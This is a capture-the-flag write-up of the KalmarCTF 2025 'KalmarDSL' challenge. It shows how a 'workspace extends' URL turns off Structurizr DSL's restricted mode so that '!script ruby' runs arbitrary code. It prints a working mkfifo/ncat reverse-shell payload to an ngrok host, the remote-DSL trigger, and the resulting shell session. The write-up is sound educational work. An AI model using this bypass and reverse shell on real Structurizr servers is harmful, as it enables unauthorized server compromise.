# KalmarDSL

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Solved by: @siunam
- 14 solves / 366 points
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

A !flag in my diagram? Hopefully someone has already patched the C4.

**Note:** The setup has no Structurizr users and default creds are not supposed to work. Bruteforce is not allowed (and will not work). Goal is Unauthenticated RCE, _0day go brrr?_

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250312211352.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250313143432.png)

In here, we can see that this web application uses [Structurizr](https://structurizr.com/), which is a software that allows users to create multiple software architecture diagrams from a single model. It also supports the [C4 model for visualizing software architecture](https://c4model.com).

Let's see how this challenge setup the Structurizr!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/web/KalmarDSL/handout.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/KalmarCTF-2025/web/KalmarDSL)-[2025.03.13|14:36:50(HKT)]
└> file handout.zip 
handout.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/KalmarCTF-2025/web/KalmarDSL)-[2025.03.13|14:36:53(HKT)]
└> unzip handout.zip   
Archive:  handout.zip
   creating: handout/
  inflating: handout/Dockerfile      
 extracting: handout/flag.txt        
  inflating: handout/would.c         
  inflating: handout/docker-compose.yml  
```

In `handout/docker-compose.yml`, we can see that it has 1 service, `tomcat`:

```yaml
services:
  tomcat:
    build: .
    ports:
      # People might already have stuff running on port 8080, so use less popular port 8281
      - "8281:8080"
    container_name: struct-container
    restart: unless-stopped
```

And it'll build the Docker image based on `handout/Dockerfile`'s instructions. Let's walk through it!

First, it'll compile the C program `would.c` to an executable:

```bash
# Build read flag binary
FROM gcc:latest AS gccbuilder
WORKDIR /
COPY would.c /
RUN gcc -o would would.c
```

In that C program, it'll print out the flag when arguments `you be so kind to provide me with a flag` is provided.

With that said, we need to somehow **gain Remote Code Execution (RCE)** to get the flag.

Then, it'll clone the Git repository [Structurizr UI](https://github.com/structurizr/ui) and [Structurizr on-premises installation](https://github.com/structurizr/onpremises). It also set the on-premises installation to version 3.1.0 by changing the commit version to [c11ff7c3986529839ba4cf9c6fd9efa3b9045f1c](https://github.com/structurizr/onpremises/tree/c11ff7c3986529839ba4cf9c6fd9efa3b9045f1c):

```bash
[...]
# Build challenge WAR file
FROM gradle:jdk17-noble AS gradlebuilder
WORKDIR /
RUN git clone https://github.com/structurizr/ui.git structurizr-ui
RUN git clone https://github.com/structurizr/onpremises.git structurizr-onpremises
WORKDIR /structurizr-onpremises
# Target: structurizr/onpremises v3.1.0
RUN git reset --hard c11ff7c3986529839ba4cf9c6fd9efa3b9045f1c
RUN echo 'structurizrVersion=3.1.0' > gradle.properties
```

Next, it'll add dependency [JRuby](https://www.jruby.org/) to the on-premises installation and start building both the UI and on-premises version:

```bash
[...]
# Fix 'bug' in structurizr/onpremises: the !script tag didn't work.
RUN sed -i '/^dependencies/a \    implementation "org.jruby:jruby-core:9.4.12.0"' structurizr-onpremises/build.gradle
RUN bash ./ui.sh
RUN ./gradlew clean build -x integrationTest
```

In the comment, we can see that it says "the `!script` tag didn't work." Hmm... Maybe that's a hint for this challenge?

After building the above Structurizr, it'll also install [`ncat`](https://nmap.org/ncat/):

```bash
[...]
# ... you're welcome!
RUN set -eux; \
    apt-get update; \
    apt-get install -y --no-install-recommends ncat
```

Hmm... Maybe it'll help us at some point? idk.

Finally, it'll copy the compiled on-premises installation WAR file to path `/usr/local/tomcat/webapps/ROOT.war` and start Structurizr:

```bash
[...]
COPY --from=gradlebuilder /structurizr-onpremises/structurizr-onpremises/build/libs/structurizr-onpremises.war /usr/local/tomcat/webapps/ROOT.war

EXPOSE 8080

CMD ["catalina.sh", "run"]
```

So, maybe this challenge requires us to find a 0-day or 1-day vulnerability in Structurizr version 3.1.0?

In the index page, we can see that there's a "Sign in" button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250313145534.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250313145543.png)

However, the challenge's description says: "The setup has no Structurizr users and default creds are not supposed to work. Bruteforce is not allowed (and will not work)." So, this "Sign in" page shouldn't be relevant in this challenge.

Also, in the footer, we can see that it has a link called "DSL editor":

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250313145700.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250313145737.png)

According to [Structurizr DSL documentation](https://docs.structurizr.com/dsl), this editor provides a way to define a software architecture model (based upon the [C4 model](https://c4model.com)) using a text-based domain specific language (DSL). Sounds cool!

In here, we can see that there's an "Upload" button. Maybe we can upload arbitrary files to the server? Well, turns out, the uploaded file will just be shown in our client-side, the DSL editor. So, nope.

In the bottom of this DSL editor, we can see something interesting:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250313150219.png)

Huh, really?

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250313150404.png)

Hmm... "**Restricted mode**"?? Same thing goes with the `!script` tag:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250313150502.png)

Although I couldn't find any documentation about this restricted mode, we can make an educated guess that this mode is to prevent users to do something terrible against this software.

For instance, if we look at [the documentation about language reference for `!script` tag](https://docs.structurizr.com/dsl/language#script), it said: "The `!script` keyword can be used to run inline or external scripts in a number of JVM compatible languages."

In [the `!script` tag documentation](https://docs.structurizr.com/dsl/scripts), we can see that JavaScript, Kotlin, Groovy, and Ruby are supported out of the box.

Hmm... If we can **bypass the restriction mode**, maybe we can **execute arbitrary server-side code**?! Let's dig through the source code!

After cloning the on-premises installation GitHub repository and change to commit version `c11ff7c3986529839ba4cf9c6fd9efa3b9045f1c`, we can search for something like `restricted`.

Eventually, we can 2 places have this keyword. For example, in method `fromDsl` class `PublicDslController`: ([`structurizr-onpremises/src/main/java/com/structurizr/onpremises/web/dsl/PublicDslController.java` line 118](https://github.com/structurizr/onpremises/blob/c11ff7c3986529839ba4cf9c6fd9efa3b9045f1c/structurizr-onpremises/src/main/java/com/structurizr/onpremises/web/dsl/PublicDslController.java#L118))

```java
@Controller
public class PublicDslController extends AbstractController {
    [...]
    private Workspace fromDsl(String dsl) throws StructurizrDslParserException, WorkspaceScopeValidationException {
        StructurizrDslParser parser = new StructurizrDslParser();
        parser.setRestricted(true);
        parser.parse(dsl);
        [...]
    }
}
```

As you can see, it creates a new `StructurizrDslParser` object instance, sets the restricted mode to `true`, and parses the given DSL code.

If we trace back how this method is being called, we can see that it's called by method `show`:

```java
@Controller
public class PublicDslController extends AbstractController {
    [...]
    public String show(ModelMap model, String source, String json, String view) throws Exception {
        [...]
        try {
            workspace = fromDsl(source);
        } catch (StructurizrDslParserException e) {
            [...]
        } catch (WorkspaceScopeValidationException e) {
            [...]
        }
        [...]
    }
}
```

Which is called by method `postDsl` or `showDslDemoPage` if using method POST or GET:

```java
@Controller
public class PublicDslController extends AbstractController {
    [...]
    @RequestMapping(value = "/dsl", method = RequestMethod.GET)
    public String showDslDemoPage(
            @RequestParam(required = false, defaultValue = "") String src,
            @RequestParam(required = false, defaultValue = "") String view,
            ModelMap model) throws Exception {
        [...]
        return show(model, src, null, view);
    }
    [...]
    @RequestMapping(value = "/dsl", method = RequestMethod.POST)
    public String postDsl(ModelMap model,
                       @RequestParam(required = true) String source,
                       @RequestParam(required = false) String json,
                       @RequestParam(required = false, defaultValue = "") String view) throws Exception {
        [...]
        return show(model, source, json, view);
    }
}
```

Which means, the public DSL controller (`/dsl`) is using restricted mode by default.

Hmm... I wonder **how the DSL parser parse our `source`**. Maybe we can find something to set the restricted mode to `false`? Or, method `setRestricted` is called somewhere else?

If you're using Visual Studio Code, we can press our Shift + F12 key (Go to References) on the `setRestricted` method to find all this method's references. (Or clone their [Structurizr for Java](https://github.com/structurizr/java/tree/master) and find them in the [DSL library source code](https://github.com/structurizr/java/tree/master/structurizr-dsl)).

After doing so, we can find this very interesting code in method `parse` from class `WorkspaceParser`: ([`src/main/java/com/structurizr/dsl/WorkspaceParser.java` line 49](https://github.com/structurizr/java/blob/master/structurizr-dsl/src/main/java/com/structurizr/dsl/WorkspaceParser.java#L49))

```java
final class WorkspaceParser extends AbstractParser {
    [...]
    Workspace parse(DslParserContext context, Tokens tokens) {
        [...]
        if (tokens.includes(FIRST_INDEX)) {
            [...]
            if (StructurizrDslTokens.EXTENDS_TOKEN.equals(firstToken)) {
                if (tokens.includes(SECOND_INDEX)) {
                    [...]
                    try {
                        if (source.startsWith("https://") || source.startsWith("http://")) {
                            [...]
                            if (source.endsWith(".json") || content.getContentType().startsWith(RemoteContent.CONTENT_TYPE_JSON)) {
                                [...]
                            } else {
                                [...]
                                structurizrDslParser.setRestricted(context.isRestricted());
                                [...]
                            }
                        } else {
                            [...]
                        }
                        [...]
                    }
                    [...]
                }
                [...]
            }
            [...]
        }
    }
}
```

In this method, the parser will set the restricted mode based on the `context` is restricted or not.

Hmm... What's the `context` from class `DslParserContext`? And what if the `context` is not restricted?

If we really want to figure what that `context` is, we can see that class `structurizrDslParser` method `parse` will create a new `DslParserContext` object instance if the `source` contains `WORKSPACE_TOKEN` (`workspace`): ([`src/main/java/com/structurizr/dsl/StructurizrDslParser.java` line 639](https://github.com/structurizr/java/blob/db96f9ad6181e63b2294072e382119c2feb8909a/structurizr-dsl/src/main/java/com/structurizr/dsl/StructurizrDslParser.java#L639))

```java
public final class StructurizrDslParser extends StructurizrDslTokens {
    [...]
    void parse(List<String> lines, File dslFile, boolean fragment, boolean includeInDslSourceLines) throws StructurizrDslParserException {
        List<DslLine> dslLines = preProcessLines(lines);

        for (DslLine dslLine : dslLines) {
            [...]
            try {
                if (EMPTY_LINE_PATTERN.matcher(line).matches()) {
                    [...]
                [...]
                } else if (WORKSPACE_TOKEN.equalsIgnoreCase(firstToken) && contextStack.empty()) {
                    [...]
                    DslParserContext dslParserContext = new DslParserContext(this, dslFile, restricted);
                    dslParserContext.setIdentifierRegister(identifiersRegister);

                    workspace = new WorkspaceParser().parse(dslParserContext, tokens.withoutContextStartToken());
                    [...]
                }
                [...]
            } catch (Exception e) {
                [...]
            }
        }
        [...]
    }
}
```

In here, the `DslParserContext` will initialize the restricted mode. Which, surprisingly, **the default value is `false`**: ([`src/main/java/com/structurizr/dsl/StructurizrDslParser.java` line 65](https://github.com/structurizr/java/blob/db96f9ad6181e63b2294072e382119c2feb8909a/structurizr-dsl/src/main/java/com/structurizr/dsl/StructurizrDslParser.java#L65))

```java
public final class StructurizrDslParser extends StructurizrDslTokens {
    [...]
    private boolean restricted = false;
    [...]
}
```

With that said, **if `workspace` is in the source, the restricted mode is `false` by default**!

If we go back to the `setRestricted` method call again, we can see that it has a gaint nested if statements:

```java
final class WorkspaceParser extends AbstractParser {
    [...]
    Workspace parse(DslParserContext context, Tokens tokens) {
        [...]
        if (tokens.includes(FIRST_INDEX)) {
            [...]
            if (StructurizrDslTokens.EXTENDS_TOKEN.equals(firstToken)) {
                if (tokens.includes(SECOND_INDEX)) {
                    [...]
                    try {
                        if (source.startsWith("https://") || source.startsWith("http://")) {
                            [...]
                            if (source.endsWith(".json") || content.getContentType().startsWith(RemoteContent.CONTENT_TYPE_JSON)) {
                                [...]
                            } else {
                                [...]
                                structurizrDslParser.setRestricted(context.isRestricted());
                                [...]
                            }
                        } else {
                            [...]
                        }
                        [...]
                    }
                    [...]
                }
                [...]
            }
            [...]
        }
    }
}
```

Basically, the parser will set the restricted mode to `false` when the following DSL code is provided:

```
workspace extends http://example.com/ {
    
}
```

According to the [Structurizr DSL workspace extension documentation](https://docs.structurizr.com/dsl/cookbook/workspace-extension/), it allows us to extend an existing workspace, enabling you to reuse common elements/relationships across multiple workspaces.

So, if the workspace is NOT in restricted mode, we can now use the `!script` tag to execute arbitrary server-side code, right?!

In the [`!script` tag's inline script documentation](https://docs.structurizr.com/dsl/scripts#inline-scripts), we can use the `!script` keyword followed by the language we’d like to use (`groovy`, `kotlin`, `ruby`, or `javascript`). Let's try `groovy` first!

First, we need to host our own malicious DSL code:

`exploit.dsl`:

```
workspace {
    !script groovy {
        value = "anything"
    }
}
```

```shell
┌[siunam♥Mercury]-(~/ctf/KalmarCTF-2025/web/KalmarDSL)-[2025.03.13|16:32:52(HKT)]
└> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

```shell
┌[siunam♥Mercury]-(~/ctf/KalmarCTF-2025/web/KalmarDSL)-[2025.03.13|16:33:20(HKT)]
└> ngrok tcp 8000
[...]
Forwarding                    tcp://0.tcp.ap.ngrok.io:17964 -> localhost:8000                               
[...]
```

Then, we can submit (Render) the following DSL payload:

```
workspace extends http://0.tcp.ap.ngrok.io:17964/exploit.dsl {
    
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250313163426.png)

Wait, `Could not load a scripting engine for extension "groovy"`?? It seems like it doesn't support Groovy.

How about `kotlin`?

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250313163618.png)

Nope.

`ruby`??

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250313163639.png)

Oh, it worked!

Remember the weird "bug" fix in the challenge's `Dockerfile`?

```bash
# Fix 'bug' in structurizr/onpremises: the !script tag didn't work.
RUN sed -i '/^dependencies/a \    implementation "org.jruby:jruby-core:9.4.12.0"' structurizr-onpremises/build.gradle
```

Looks like only Ruby is supported for the `!script` tag! Now let's get a reverse shell using the handy `ncat` tool!

## Exploitation

Armed with above information, we can gain RCE and get a reverse shell via the following steps:
1. Host our own DSL file, which executes arbitrary Ruby code via the `!script` tag
2. Submit our DSL payload, where it uses the `extends` keyword to set the restricted mode to `false`

- Setup a netcat listener:

```shell
┌[siunam♥Mercury]-(~/ctf/KalmarCTF-2025/web/KalmarDSL)-[2025.03.13|16:41:20(HKT)]
└> nc -lnvp 4444             
Listening on 0.0.0.0 4444

```

- Setup port forwarding:

```shell
┌[siunam♥Mercury]-(~/ctf/KalmarCTF-2025/web/KalmarDSL)-[2025.03.13|16:41:21(HKT)]
└> ngrok tcp 4444
[...]
Forwarding                    tcp://0.tcp.ap.ngrok.io:11310 -> localhost:4444                               
[...]
```

- Host our own DSL file:

```
workspace {
    !script ruby {
        value = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat 0.tcp.ap.ngrok.io 11310 >/tmp/f`
    }
}
```

> Note: Since `ngrok` free plan only allows 1 instance, I'll host this file on [requestrepo.com](https://requestrepo.com).

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250313164545.png)

- Submit our DSL payload:

```
workspace extends http://kmfe5wjp.requestrepo.com/exploit.dsl {
    
}
```

- Submit and profit!

```shell
┌[siunam♥Mercury]-(~/ctf/KalmarCTF-2025/web/KalmarDSL)-[2025.03.13|16:41:20(HKT)]
└> nc -lnvp 4444             
[...]
Connection received on 127.0.0.1 47932
/bin/sh: 0: can't access tty; job control turned off
$ whoami; id; hostname
tomcatuser
uid=999(tomcatuser) gid=999(tomcatgroup) groups=999(tomcatgroup)
c1dd053b8164
$ 
```

```shell
$ /would you be so kind to provide me with a flag 
kalmar{Y0_d4wg_I_He4rd_y0U_l1ke_DSL_s0_I_extended_y0ur_DSL_W1th_a_R3m0t3_DSL}
```

- **Flag: `kalmar{Y0_d4wg_I_He4rd_y0U_l1ke_DSL_s0_I_extended_y0ur_DSL_W1th_a_R3m0t3_DSL}`**

## Conclusion

What we've learned:

1. Structurizr DSL Remote Code Execution via workspace extension